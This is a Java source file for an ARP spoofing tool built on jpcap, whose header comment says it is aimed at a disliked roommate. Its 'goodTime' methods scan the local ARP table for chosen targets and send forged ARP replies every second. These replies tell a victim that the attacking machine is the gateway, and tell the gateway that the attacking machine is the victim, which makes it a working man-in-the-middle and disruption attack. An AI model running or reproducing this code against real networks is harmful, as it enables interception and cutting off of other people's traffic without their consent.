package com.aliyunarp.arp;

import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.aliyunarp.util.MacUtil;
import com.aliyunarp.util.NetsUtil;
import com.chileqi.threadpoolclients.ThreadPoolClients;
import com.chileqi.threadpoolclients.ThreadPoolClients.ThreadPoolEntity;
import com.chileqi.threadpoolclients.ThreadPoolTask;

import cn.hutool.core.util.ArrayUtil;
import cn.hutool.core.util.StrUtil;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;

/**
 * 本程序针对不讲究室友 （偷人东西，恶意占用公共空间，乱扔别人东西，还嘲笑别人 --整扔笑君）
 * 
 * @author haha~~
 *
 */
public class Arp {

	private volatile Map<String, ArpInfo> arpStatic = new HashMap<String, ArpInfo>();// key是ip地址
	private volatile ArpInfo wanStatic = null;
	private volatile ArpInfo selfStatic = null;
	private volatile ArpInfo randomStatic = null;
	private volatile JpcapSender sender = null;
	private double count = 1;

	/**
	 * 玩的开心
	 * 
	 * @param device
	 * @param matchStrs
	 */
	public void goodTimeByIp(NetworkInterface device, String... matchStrs) {
		arpStatic.clear();
		goodTime(device, 0, matchStrs);
	}

	/**
	 * 玩的开心
	 * 
	 * @param device
	 * @param targetInfos
	 */
	public void goodTimeByIp(NetworkInterface device, ArpInfo... targetInfos) {
		arpStatic.clear();
		if (null != targetInfos) {
			for (ArpInfo arpInfo : targetInfos) {
				if (null != arpInfo)
					arpStatic.put(arpInfo.getIp(), new ArpInfo(arpInfo.getIp(), arpInfo.getMac(), arpInfo.getName()));
			}
		}
		String[] ms = null;
		goodTime(device, 0, ms);
	}

	/**
	 * 玩的开心
	 * 
	 * @param device
	 * @param matchStrs
	 */
	public void goodTimeByMac(NetworkInterface device, String... matchStrs) {
		arpStatic.clear();
		goodTime(device, 1, matchStrs);
	}

	/**
	 * 玩的开心
	 * 
	 * @param device
	 * @param targetInfos
	 */
	public void goodTimeByMac(NetworkInterface device, ArpInfo... targetInfos) {
		arpStatic.clear();

		if (null != targetInfos) {
			for (ArpInfo arpInfo : targetInfos) {
				if (null != arpInfo)
					arpStatic.put(arpInfo.getMac(), new ArpInfo(arpInfo.getIp(), arpInfo.getMac(), arpInfo.getName()));
			}
		}
		String[] ms = null;
		goodTime(device, 1, ms);
	}

	/**
	 * 玩的开心
	 * 
	 * @param device
	 * @param type      0 ip 1 mac
	 * @param matchStrs
	 */
	public void goodTime(NetworkInterface device, int type, String... matchStrs) {
		try {

			ThreadPoolClients tpc = new ThreadPoolClients(3);

			// arp -a 可疑人物ip mac
			tpc.add(new ThreadPoolTask() {
				@Override
				public Object call() throws Exception {
					int i = 1;

					if (ArrayUtil.isNotEmpty(matchStrs)) {
						while (i == 1) {
							try {
								List<ArpInfo> list = NetsUtil.getArpListInfo();
								list.stream().filter(x -> matchs(x, matchStrs)).forEach(y -> {
									if (type == 1) {
										arpStatic.put(y.getMac(), y);
									} else {
										arpStatic.put(y.getIp(), y);
									}
								});
								Thread.sleep(30 * 1000);
							} catch (InterruptedException e) {
							}
						}
					}
					return super.call();
				}
			});
			// 刷新本机以及网关ip mac
			tpc.add(new ThreadPoolTask() {
				@Override
				public Object call() throws Exception {
					int i = 1;
					while (i == 1) {
						try {
							String selfIpStr = NetsUtil.getIpAddress();// 本机IP地址
							String selfMacStr = NetsUtil.getMacAddress();// 本机Mac地址
							String wanIpStr = NetsUtil.getWanIp(selfIpStr);// 局域网网关IP
							String wanMacStr = NetsUtil.getMacAddress(wanIpStr);// 局域网网关Mac
							// 随机
							randomStatic=new ArpInfo(NetsUtil.getRandomIp(wanIpStr), MacUtil.randomMac("-").toUpperCase());
							// 本机
							selfStatic = new ArpInfo(selfIpStr, selfMacStr);
							// 局域网网关
							wanStatic = new ArpInfo(wanIpStr, wanMacStr);
							Thread.sleep(100 * 1000);
						} catch (Exception e) {
						}
					}
					return super.call();
				}
			});
			// 定时发包
			tpc.add(new ThreadPoolTask() {
				@Override
				public Object call() throws Exception {
					count = 1;
					sender = JpcapSender.openDevice(device);
					while (count > 0) {
						if (wanStatic != null && selfStatic != null) {
							arpStatic.forEach((k, v) -> {
								try {
									try {
										ARPPacket[] arps = getARPPackets(wanStatic, selfStatic, v);
										sendPackets(sender, arps);
										System.out.println(StrUtil.blankToDefault(v.getMac(), v.getIp()) + "已发送：" + count);
									} catch (Exception e) {
										sender = JpcapSender.openDevice(device);
									}
								} catch (Exception e1) {
								}
							});
							count++;
							Thread.sleep(1 * 1000);
						}
					}
					return super.call();
				}
			});

			List<ThreadPoolEntity> list = tpc.submits();

			for (ThreadPoolEntity tpe : list) {
				System.out.println(tpe.getKey() + "\t" + tpe.getFuture().get());
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	/**
	 * 玩的开心
	 * 
	 * @param device
	 * @param targetInfo
	 */
	public void goodTime(NetworkInterface device, ArpInfo... targetInfos) {

		try {
			if (null != targetInfos) {
				for (ArpInfo arpInfo : targetInfos) {
					if (null != arpInfo)
						arpStatic.put(arpInfo.getIp(), new ArpInfo(arpInfo.getIp(), arpInfo.getMac(), arpInfo.getName()));
				}
			}
			String[] ms = null;
			goodTime(device, 0, ms);
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	/**
	 * 玩的开心
	 * 
	 * @param device
	 * @param time
	 * @param targetInfo
	 */
	public void goodTime(NetworkInterface device, int time, ArpInfo targetInfo) {

		String selfIpStr = NetsUtil.getIpAddress();// 本机IP地址
		String selfMacStr = NetsUtil.getMacAddress();// 本机Mac地址
		String wanIpStr = NetsUtil.getWanIp(selfIpStr);// 局域网网关IP
		String wanMacStr = NetsUtil.getMacAddress(wanIpStr);// 局域网网关Mac

		// 本机
		ArpInfo selfInfo = new ArpInfo(selfIpStr, selfMacStr);
		// 局域网网关
		ArpInfo wanInfo = new ArpInfo(wanIpStr, wanMacStr);

		goodTime(device, time, selfInfo, wanInfo, targetInfo);

	}

	/**
	 * 原始方法(仅供参考学习)
	 * 
	 * @param device
	 * @param arpIp
	 */
	@Deprecated
	private void goodTime(NetworkInterface device, String arpIp) {

		String wanIpStr = NetsUtil.getWanIp(arpIp);
		int time = 1; // 重发间隔时间
		// System.out.print("本机IP地址：");
		String ipStr = NetsUtil.getIpAddress();
		// System.out.print("本机Mac地址：");
		String macStr = NetsUtil.getMacAddress();

		try {
			InetAddress myIp = InetAddress.getByName(ipStr);
			byte[] myMac = strToMac(macStr);

			String arpMac = NetsUtil.getMacAddress(arpIp);
			InetAddress targetIp = InetAddress.getByName(arpIp);
			// arpMac = NetsUtil.getMacAddress(targetIp.getHostAddress());
			arpMac = StrUtil.blankToDefault(arpMac, "FF-FF-FF-FF-FF-FF");

			byte[] targetMac = strToMac(arpMac);

			// 网关的IP与Mac
			InetAddress wanIp = InetAddress.getByName(wanIpStr);
			String wanMacStr = NetsUtil.getMacAddress(wanIp.getHostName());
			byte[] wanMac = strToMac(wanMacStr);

			JpcapSender sender = JpcapSender.openDevice(device);

			// 告诉目标主机：我是路由器（根据IP来确定身份），实则填写的却是本机的Mac地址
			ARPPacket arp1 = getARPPacket(myMac, wanIp, targetMac, targetIp);
			// 同样的方式欺骗路由器
			ARPPacket arp2 = getARPPacket(myMac, targetIp, wanMac, wanIp);
			// 在欺骗目标的同时，自己的主机ARP表也会被破坏，导致访问不到路由器
			// 所以下面两个包是告诉本机正确的IP地址对应的Mac地址
			ARPPacket arp3 = getARPPacket(wanMac, wanIp, myMac, myIp);
			ARPPacket arp4 = getARPPacket(targetMac, targetIp, myMac, myIp);

			// 发送ARP应答包
			for (int i = 1; true; i++) {
				try {
					sender.sendPacket(arp1);
					sender.sendPacket(arp2);
					sender.sendPacket(arp3);
					sender.sendPacket(arp4);

					System.out.println("已发送： " + i);
				} catch (Exception e) {
					sender = JpcapSender.openDevice(device);
				}
				Thread.sleep(time * 1000);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	/**
	 * 
	 * @param device     驱动
	 * @param time       重发间隔时间（秒）
	 * @param selfInfo   本机
	 * @param wanInfo    网关
	 * @param targetInfo 目标
	 */
	private void goodTime(NetworkInterface device, int time, ArpInfo selfInfo, ArpInfo wanInfo, ArpInfo targetInfo) {
		try {
			JpcapSender sender = JpcapSender.openDevice(device);
			ARPPacket[] arps = getARPPackets(wanInfo, selfInfo, targetInfo);
			// 发送ARP应答包
			for (double i = 1; true; i++) {
				try {
					sendPackets(sender, arps);
					System.out.println(targetInfo.getIp() + " 已发送： " + i);
				} catch (Exception e) {
					sender = JpcapSender.openDevice(device);
				}
				Thread.sleep(time * 1000);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 发送包
	 * 
	 * @param sender
	 * @param arps
	 */
	private void sendPackets(JpcapSender sender, ARPPacket... arps) {
		for (ARPPacket arpPacket : arps) {
			sender.sendPacket(arpPacket);
		}
	}

	/**
	 * a 初始化要发送的包(原理) b 告诉目标主机：我是路由器（根据IP来确定身份），实则填写的却是本机的Mac地址 c 同样的方式欺骗路由器 d 在欺骗目标的同时，自己的主机ARP表也会被破坏，导致访问不到路由器,两个包是告诉本机正确的IP地址对应的Mac地址
	 * 
	 * @param wanInfo
	 * @param selfInfo
	 * @param targetInfo
	 * @return
	 */
	private ARPPacket[] getARPPackets(ArpInfo wanInfo, ArpInfo selfInfo, ArpInfo targetInfo) {

		ARPPacket[] arps = new ARPPacket[4];
		try {
			// 1.本机的IP与Mac
			InetAddress myIp = InetAddress.getByName(selfInfo.getIp());
			byte[] myMac = strToMac(selfInfo.getMac());

			// 2.网关的IP与Mac
			InetAddress wanIp = InetAddress.getByName(wanInfo.getIp());
			String wanMacStr = wanInfo.getMac();
			if (StrUtil.isEmpty(wanMacStr)) {
				wanMacStr = NetsUtil.getMacAddress(wanIp.getHostName());
			}
			byte[] wanMac = strToMac(wanMacStr);

			// 3.被攻击者的IP与Mac
			String arpMac = targetInfo.getMac();
			InetAddress targetIp = InetAddress.getByName(targetInfo.getIp());
			if (StrUtil.isEmpty(arpMac)) {
				// arpMac = NetsUtil.getMacAddress(arpIp);
				arpMac = NetsUtil.getMacAddress(targetIp.getHostAddress());
				arpMac = StrUtil.blankToDefault(arpMac, "FF-FF-FF-FF-FF-FF");// 默认一个
			}
			byte[] targetMac = strToMac(arpMac);
			// 4.
			
			// 告诉目标主机：我是路由器（根据IP来确定身份），实则填写的却是本机的Mac地址
			
			ARPPacket arp1 = getARPPacket(myMac, wanIp, targetMac, targetIp);
			// 同样的方式欺骗路由器
			ARPPacket arp2 = getARPPacket(myMac, targetIp, wanMac, wanIp);
			// 在欺骗目标的同时，自己的主机ARP表也会被破坏，导致访问不到路由器
			// 所以下面两个包是告诉本机正确的IP地址对应的Mac地址
			ARPPacket arp3 = getARPPacket(wanMac, wanIp, myMac, myIp);
			ARPPacket arp4 = getARPPacket(targetMac, targetIp, myMac, myIp);

			arps[0] = arp1;
			arps[1] = arp2;
			arps[2] = arp3;
			arps[3] = arp4;

		} catch (Exception e) {

		}

		return arps;
	}

	/**
	 * 构造ARP包的方法
	 */
	private ARPPacket getARPPacket(byte[] sender_hardaddr, InetAddress sender_protoaddr, byte[] target_hardaddr, InetAddress target_protoaddr) {

		ARPPacket arp = new ARPPacket();

		arp.hardtype = ARPPacket.HARDTYPE_ETHER;
		arp.prototype = ARPPacket.PROTOTYPE_IP;
		arp.operation = ARPPacket.ARP_REPLY;
		arp.hlen = 6;
		arp.plen = 4;
		arp.sender_hardaddr = sender_hardaddr;
		arp.sender_protoaddr = sender_protoaddr.getAddress();
		arp.target_hardaddr = target_hardaddr;
		arp.target_protoaddr = target_protoaddr.getAddress();

		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_ARP;
		ether.src_mac = sender_hardaddr;
		ether.dst_mac = target_hardaddr;
		arp.datalink = ether;

		return arp;
	}

	/**
	 * mac地址转byte数组的方法
	 * 
	 * @param s
	 * @return
	 */
	public byte[] strToMac(String s) {
		byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
		String[] s1 = s.split("-");
		for (int x = 0; x < s1.length; x++) {
			mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
		}
		return mac;
	}
	/**
	 * mac地址转字符串的方法
	 * @param mac
	 * @return
	 */
	public static String macToStr(byte[] mac) {
		StringBuffer sb = new StringBuffer("");
        for(int i=0; i<mac.length; i++) {
            if(i!=0) {
                sb.append("-");
            }
            int temp = mac[i]&0xff;
            String str = Integer.toHexString(temp);
            if(str.length()==1) {
                sb.append("0"+str);
            }else {
                sb.append(str);
            }
        }
        return sb.toString().toUpperCase();
	}
	/**
	 * 通过发送ARP请求包来获取某一IP地址主机的MAC地址。
	 * 
	 * @param ip //未知MAC地址主机的IP地址
	 * @return //已知IP地址的MAC地址
	 * @throws IOException
	 */
	public static byte[] getMacByIp(NetworkInterface device, String localIp, String ip) throws Exception {
		
		JpcapCaptor jc = JpcapCaptor.openDevice(device, 20, false, 30); // 打开网络设备，用来侦听
		JpcapSender sender = jc.getJpcapSenderInstance(); // 发送器JpcapSender，用来发送报文
		InetAddress senderIP = InetAddress.getByName(localIp); // 设置本地主机的IP地址，方便接收对方返回的报文
		InetAddress targetIP = InetAddress.getByName(ip); // 目标主机的IP地址
		
		ARPPacket arp = new ARPPacket(); // 开始构造一个ARP包
		arp.hardtype = ARPPacket.HARDTYPE_ETHER; // 硬件类型
		arp.prototype = ARPPacket.PROTOTYPE_IP; // 协议类型
		arp.operation = ARPPacket.ARP_REQUEST; // 指明是ARP请求包
		arp.hlen = 6; // 物理地址长度
		arp.plen = 4; // 协议地址长度
		arp.sender_hardaddr = device.mac_address; // ARP包的发送端以太网地址,在这里即本地主机地址
		arp.sender_protoaddr = senderIP.getAddress(); // 发送端IP地址, 在这里即本地IP地址

		byte[] broadcast = new byte[] { (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255 }; // 广播地址
		arp.target_hardaddr = broadcast; // 设置目的端的以太网地址为广播地址
		arp.target_protoaddr = targetIP.getAddress(); // 目的端IP地址

		// 构造以太帧首部
		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_ARP; // 帧类型
		ether.src_mac = device.mac_address; // 源MAC地址
		ether.dst_mac = broadcast; // 以太网目的地址，广播地址
		arp.datalink = ether; // 将arp报文的数据链路层的帧设置为刚刚构造的以太帧赋给

		sender.sendPacket(arp); // 发送ARP报文

		while (true) { // 获取ARP回复包，从中提取出目的主机的MAC地址，如果返回的是网关地址，表明目的IP不是局域网内的地址
			Packet packet = jc.getPacket();
			if (packet instanceof ARPPacket) {
				ARPPacket p = (ARPPacket) packet;
				if (null==p) {
					return null; // 这种情况也属于目的主机不是本地地址
				}
				if (Arrays.equals(p.target_protoaddr, senderIP.getAddress())) {
					System.out.println("get mac ok"+macToStr(p.sender_hardaddr));
					return p.sender_hardaddr; // 返回
				}
			}
		}
	}

	/**
	 * 是否匹配
	 * 
	 * @param ai
	 * @param matchStrs
	 * @return
	 */
	private boolean matchs(ArpInfo ai, String... matchStrs) {
		return StrUtil.containsAnyIgnoreCase(ai.getIp(), matchStrs) || StrUtil.containsAnyIgnoreCase(ai.getMac(), matchStrs) || StrUtil.containsAnyIgnoreCase(ai.getName(), matchStrs);
	}

}
